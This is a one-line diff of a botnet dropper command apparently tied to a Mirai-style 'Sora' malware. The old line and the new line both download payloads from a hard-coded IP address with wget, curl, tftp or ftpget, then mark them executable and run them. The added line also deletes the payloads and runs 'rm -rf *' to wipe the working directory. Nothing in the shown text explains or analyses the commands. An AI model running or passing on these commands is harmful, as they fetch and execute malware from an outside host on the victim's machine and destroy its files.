@@ -1,1 +1,1 @@
-cd /tmp; wget http://206.189.13.212/sora.x86; chmod +x sora.x86; ./sora.x86
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://206.189.13.212/sora.sh; curl -O http://206.189.13.212/sora.sh; chmod 777 sora.sh; sh sora.sh; tftp 206.189.13.212 -c get sora.sh; chmod 777 sora.sh; sh sora.sh; tftp -r sora2.sh -g 206.189.13.212; chmod 777 sora2.sh; sh sora2.sh; ftpget -v -u anonymous -p anonymous -P 21 206.189.13.212 sora1.sh sora1.sh; sh sora1.sh; rm -rf sora.sh sora.sh sora2.sh sora1.sh; rm -rf *
